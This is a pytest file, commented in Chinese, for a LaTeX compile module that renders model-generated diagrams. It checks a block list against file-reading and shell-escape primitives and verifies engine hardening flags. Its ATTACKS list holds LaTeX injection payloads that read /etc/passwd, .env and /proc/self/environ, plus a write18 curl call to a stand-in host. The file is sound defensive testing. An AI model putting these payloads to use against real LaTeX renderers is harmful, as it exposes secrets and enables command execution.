# -*- coding: utf-8 -*-
"""tests/test_latex_security.py — LaTeX 编译的文件访问加固（安全审查 R1）。

背景（实测，见 instructions/Security-Review.md R1）：编译的是**模型生成**的
片段，而 TeX 的 ``\\input`` / ``\\openin`` / ``\\read`` 能读**任意可读文件**，
内容会排版进图里随图片回传给访客——项目根目录的 ``.env`` 正是最值钱的目标。

本文件锁住三件事：
1. **源码闸门**：片段/标题里出现文件 I/O 或包加载原语 → 拒绝编译，且**不调用
   引擎**（调用方降级为展示 LaTeX 源码）；
2. **不误伤**：正常 TikZ/chemfig（含 ``\\inputencoding``、``\\foreach``、中文）
   必须照常通过；
3. **调用形态**：原生引擎必须用"相对文件名 + cwd"调用——``openin_any=p`` 下
   kpathsea 会拒绝命令行上的绝对路径主文件，写成绝对路径会导致"每张图都编译
   不出来"（TeX Live 邮件列表 2020-09 确认）。

全部用例都不启动真实 LaTeX（引擎/子进程/subprocess 均被替换），沙箱可跑。
"""

import contextlib
import os
import types
import uuid

import pytest

from utils import latex_compile as lc


@pytest.fixture(autouse=True)
def _clear_caches():
    """`hardening_flags` / `security_status` 都是 lru_cache，用例之间必须清干净。"""
    for fn in (lc.hardening_flags, lc.security_status, lc._engine_accepts_flag):
        fn.cache_clear()
    yield
    for fn in (lc.hardening_flags, lc.security_status, lc._engine_accepts_flag):
        fn.cache_clear()


# ---------------------------------------------------------------- 1. 源码闸门

ATTACKS = [
    ("input 绝对路径", "\\input{/etc/passwd}"),
    ("input 相对上跳", "\\input{../../.env}"),
    ("input 无扩展名", "\\input{../../../proc/self/environ}"),
    ("include", "\\include{/etc/passwd}"),
    ("openin", "\\openin1=/etc/passwd"),
    ("read", "\\read1 to \\x"),
    ("readline", "\\readline1 to \\x"),
    ("write18", "\\immediate\\write18{curl evil.example/x}"),
    ("write 落盘", "\\openout1=/tmp/pwned.txt"),
    ("catcode 改字母表", "\\catcode`\\@=11"),
    ("csname 拼宏名", "\\csname input\\endcsname{/etc/passwd}"),
    ("makeatletter", "\\makeatletter\\@@input{/etc/passwd}"),
    ("usepackage", "\\usepackage{verbatim}"),
    ("RequirePackage", "\\RequirePackage{verbatim}"),
    ("verbatiminput", "\\verbatiminput{/etc/passwd}"),
    ("lstinputlisting", "\\lstinputlisting{/etc/passwd}"),
    ("inputminted", "\\inputminted{text}{/etc/passwd}"),
    ("special", "\\special{psfile=/etc/passwd}"),
    ("directlua", "\\directlua{io.open('/etc/passwd')}"),
]


@pytest.mark.parametrize("label,code", ATTACKS, ids=[a[0] for a in ATTACKS])
def test_forbidden_token_blocks_file_io(label, code):
    assert lc.forbidden_token(code) is not None, label


LEGIT = [
    ("tikz 基本", "\\begin{tikzpicture}\\draw (0,0)--(2,0);\\end{tikzpicture}"),
    ("chemfig 苯环", "\\chemfig{*6(------)}"),
    ("foreach", "\\begin{tikzpicture}\\foreach \\x in {1,2} "
                "\\draw (0,0)--(\\x,0);\\end{tikzpicture}"),
    ("中文节点", "\\begin{tikzpicture}\\node at (0,0) {反应进程};\\end{tikzpicture}"),
    ("inputencoding 只是前缀相同", "\\inputencoding{utf8}\\begin{tikzpicture}"
                                   "\\draw (0,0)--(1,0);\\end{tikzpicture}"),
    ("includegraphics 不在黑名单",
     "\\begin{tikzpicture}\\node {\\includegraphics[width=1cm]{a.png}};"
     "\\end{tikzpicture}"),
    ("arrows/pattern", "\\begin{tikzpicture}\\draw[->,thick] (0,0)--(1,0);"
                       "\\end{tikzpicture}"),
]


@pytest.mark.parametrize("label,code", LEGIT, ids=[a[0] for a in LEGIT])
def test_forbidden_token_does_not_false_positive(label, code):
    assert lc.forbidden_token(code) is None, label


def test_forbidden_token_empty_and_none():
    assert lc.forbidden_token("") is None
    assert lc.forbidden_token(None) is None


def test_write18_matches_write_not_partial():
    """`\\write18` 后面是数字，用词边界正则会漏 —— 必须按控制序列整名匹配。"""
    assert lc.forbidden_token("\\write18{x}") == "write"


# ---------------------------------------------------------------- 2. 闸门接在编译入口上

def _spy_engine(monkeypatch, calls):
    """把引擎查找与真正的编译都替换掉，只记录调用。

    ★ 必须连 `work_dir` 一起换掉：真实临时目录在受限环境（本仓库的沙箱、
    只读 /tmp 的容器）里**不可写**，`_compile_doc_to_png` 会在到达引擎之前就
    因 OSError 返回 None —— 那样"没有调用引擎"这条断言会**假通过**，
    看起来测了闸门，其实什么都没测。
    """
    monkeypatch.setattr(lc, "_find_latex_engine", lambda: "xelatex")
    monkeypatch.setattr(lc, "hardening_flags", lambda engine=None: ())
    monkeypatch.setattr(lc, "work_dir", _fake_work_dir)
    monkeypatch.setattr(lc, "_run_latex",
                        lambda *a, **k: (calls.append(a), None)[1])


def test_compile_rejects_attack_without_touching_engine(monkeypatch):
    calls = []
    _spy_engine(monkeypatch, calls)
    png = lc.compile_tikz_to_png(
        "\\input{/etc/passwd}\n"
        "\\begin{tikzpicture}\\draw (0,0)--(1,0);\\end{tikzpicture}")
    assert png is None
    assert calls == [], "命中黑名单时不该调用引擎"


def test_compile_rejects_attack_hidden_in_title(monkeypatch):
    """标题会被塞进 `\\textbf{...}`，同样能读出文件 —— 必须一起扫。"""
    calls = []
    _spy_engine(monkeypatch, calls)
    png = lc.compile_tikz_to_png(
        "\\begin{tikzpicture}\\draw (0,0)--(1,0);\\end{tikzpicture}",
        title="\\input{/etc/passwd}")
    assert png is None
    assert calls == []


def test_compile_passes_legit_code_through(monkeypatch):
    """正常片段必须照常走到引擎（闸门不能把功能堵死）。"""
    calls = []

    def fake_run(engine, tex_path, flags=()):
        calls.append((engine, flags))
        return None

    monkeypatch.setattr(lc, "_find_latex_engine", lambda: "xelatex")
    monkeypatch.setattr(lc, "_run_latex", fake_run)
    monkeypatch.setattr(lc, "work_dir", _fake_work_dir)
    lc.compile_tikz_to_png(
        "\\begin{tikzpicture}\\draw (0,0)--(2,0);\\end{tikzpicture}")
    assert len(calls) == 2, "两级重试（CJK → 英文）各应调用一次引擎"


@contextlib.contextmanager
def _fake_work_dir(prefix="chem_"):
    """临时目录替身：沙箱里 mkdtemp 建出的目录不可写，测试不该依赖它。"""
    import tempfile
    d = os.path.join(tempfile.gettempdir(), prefix + uuid.uuid4().hex[:8])
    os.makedirs(d, exist_ok=True)
    try:
        yield d
    finally:
        pass


# ---------------------------------------------------------------- 3. 加固选项探测

def test_hardening_flags_keeps_only_accepted(monkeypatch):
    monkeypatch.setattr(lc, "_find_latex_engine", lambda: "xelatex")
    monkeypatch.setattr(lc, "_engine_accepts_flag",
                        lambda engine, flag: flag != "--cnf-line=openin_any=p")
    flags = lc.hardening_flags()
    assert "--cnf-line=openin_any=p" not in flags
    assert "-no-shell-escape" in flags
    assert set(flags) <= set(lc._HARDENING_CANDIDATES)


def test_hardening_flags_empty_without_engine(monkeypatch):
    monkeypatch.setattr(lc, "_find_latex_engine", lambda: None)
    assert lc.hardening_flags() == ()


def test_security_status_cheap_does_not_verify(monkeypatch):
    monkeypatch.setattr(lc, "_find_latex_engine", lambda: "xelatex")
    monkeypatch.setattr(lc, "_engine_accepts_flag", lambda e, f: True)
    st = lc.security_status()
    assert st["flags"], "应当报告探测到的 flag"
    assert st["file_read_restricted"] is None, "便宜路径不做实测"
    assert "--security-check" in st["note"]


# ---------------------------------------------------------------- 4. 自检（verify=True）

def _install_fake_verify(monkeypatch, tmp_path, *, normal_ok=True,
                         plain_ok=True, flagged_ok=False):
    """搭一个假的 `_verify_hardening` 环境：只按 job 名决定编译成败。"""
    monkeypatch.setattr(lc, "_find_latex_engine", lambda: "xelatex")
    monkeypatch.setattr(lc, "_engine_accepts_flag", lambda e, f: True)
    monkeypatch.setattr(lc, "work_dir", _fake_work_dir)

    def fake_run(engine, tex_path, flags=()):
        job = os.path.basename(tex_path)
        if job.startswith("normal"):
            return "/tmp/x.pdf" if normal_ok else None
        if job.startswith("plain"):
            return "/tmp/x.pdf" if plain_ok else None
        if job.startswith("flag"):
            return "/tmp/x.pdf" if flagged_ok else None
        return None

    monkeypatch.setattr(lc, "_run_latex", fake_run)


def test_verify_reports_restricted_when_attack_blocked(monkeypatch):
    _install_fake_verify(monkeypatch, None, flagged_ok=False)
    st = lc.security_status(verify=True)
    assert st["file_read_restricted"] is True
    assert "被拒" in st["note"]


def test_verify_warns_when_engine_cannot_restrict(monkeypatch):
    """MiKTeX 就是这一档：flag 存在但拦不住读文件，必须给出明确警告。"""
    _install_fake_verify(monkeypatch, None, flagged_ok=True)
    st = lc.security_status(verify=True)
    assert st["file_read_restricted"] is False
    assert "独立用户" in st["note"] or "容器" in st["note"]


def test_verify_reports_unknown_when_normal_compile_breaks(monkeypatch):
    """加固把正常文档弄坏了 → 不能声称"已保护"，要说清楚。"""
    _install_fake_verify(monkeypatch, None, normal_ok=False)
    st = lc.security_status(verify=True)
    assert st["file_read_restricted"] is None
    assert "编译失败" in st["note"]


def test_verify_reports_unknown_when_control_doc_fails(monkeypatch):
    """对照文档（不带 flag）都编译不过 → 说明不了任何事。"""
    _install_fake_verify(monkeypatch, None, plain_ok=False)
    st = lc.security_status(verify=True)
    assert st["file_read_restricted"] is None
    assert "对照" in st["note"]


# ---------------------------------------------------------------- 5. 调用形态（回归护栏）

def test_run_latex_uses_relative_path_for_native_engine(monkeypatch, tmp_path):
    """★ 原生引擎必须给相对文件名 + cwd：`openin_any=p` 会拒绝绝对路径主文件，
    写成绝对路径的结果是"加固后每张图都编译不出来"。"""
    seen = {}

    def fake_subprocess_run(argv, **kw):
        seen["argv"] = list(argv)
        seen["cwd"] = kw.get("cwd")
        # 造出引擎本会产出的 PDF，让函数认为编译成功
        with open(os.path.join(kw["cwd"], "fig.pdf"), "wb") as f:
            f.write(b"%PDF-1.4")
        return types.SimpleNamespace(returncode=0)

    monkeypatch.setattr(lc.subprocess, "run", fake_subprocess_run)
    tex = os.path.join(str(tmp_path), "fig.tex")
    open(tex, "w").close()
    out = lc._run_latex("xelatex", tex, ("-no-shell-escape",))
    assert out is not None
    assert seen["cwd"] == str(tmp_path)
    assert seen["argv"][-1] == "fig.tex", "必须是相对文件名"
    assert "-output-directory=." in seen["argv"]
    assert "-no-shell-escape" in seen["argv"]
    assert not any(a.startswith("/") and a.endswith(".tex") for a in seen["argv"])


def test_run_latex_keeps_windows_abs_path_for_wsl_exe(monkeypatch, tmp_path):
    """WSL 调 Windows 的 .exe 是例外：interop 的 cwd 不可靠，仍给转换后的路径。"""
    seen = {}

    def fake_subprocess_run(argv, **kw):
        seen["argv"] = list(argv)
        with open(os.path.join(kw["cwd"], "fig.pdf"), "wb") as f:
            f.write(b"%PDF-1.4")
        return types.SimpleNamespace(returncode=0)

    monkeypatch.setattr(lc.subprocess, "run", fake_subprocess_run)
    monkeypatch.setattr(lc, "_to_win_path", lambda p: "W:" + p.replace("/", "\\"))
    fake_sys = types.SimpleNamespace(platform="linux")
    monkeypatch.setattr(lc, "sys", fake_sys)
    monkeypatch.setattr(lc, "_is_windows_exe", lambda p: True)

    tex = os.path.join(str(tmp_path), "fig.tex")
    open(tex, "w").close()
    lc._run_latex("xelatex.exe", tex, ())
    assert any(a.startswith("W:") for a in seen["argv"])
